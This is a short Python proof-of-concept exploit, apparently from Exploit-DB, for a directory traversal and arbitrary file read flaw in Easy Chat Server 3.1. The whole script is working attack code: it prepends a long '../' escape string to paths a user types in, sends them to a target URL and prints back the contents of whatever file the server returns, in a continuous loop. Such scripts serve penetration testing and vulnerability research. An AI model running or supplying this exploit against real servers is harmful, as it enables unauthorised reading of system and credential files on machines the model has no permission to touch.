# Exploits Directory Traversal and File Read vulnerability in Easy Chat Server 3.1 application
# python3 POC by Mark Kaiser for EDB-ID: 50437
#!/usr/bin/env python3

import requests, argparse

prompt = "Provide a path to file # "
escape = '/../../../../../../../../../../../..'


def lfi(target):
    '''Loop to provide continuous prompt.'''
    while True:
        directory = input(prompt)
        if directory == 'exit':
            break
        else:
            cli(target, directory)


def cli(target, directory):
    '''Makes request to vulnerable app with user specified file path.'''    
    data=(escape+directory)
    response = requests.get(target, data)
    #print(response.url)
    for line in response.text.splitlines():
        print(line)

def main():
    '''Grabs user arguments and calls appropriate functions.'''
    parser = argparse.ArgumentParser(description='Provide the url for the vulnerable Easy Chat Server.')
    parser.add_argument('-v', '--version', dest='ver', required=False, action='store_true', help='display version number.')
    parser.add_argument('-t', '--target', dest='target', required=False, type=str, help="provide a target url ex: http://10.10.10.10")
    args = parser.parse_args()

    if args.ver:
        print("ecsLFI version 0.1")
        exit()
    target = args.target
    if target == None:
        print('Usage: python3 ecsLFI.py -t [url]')
        exit(0)
    else:
        lfi(target)
        
if __name__ == '__main__':
    main()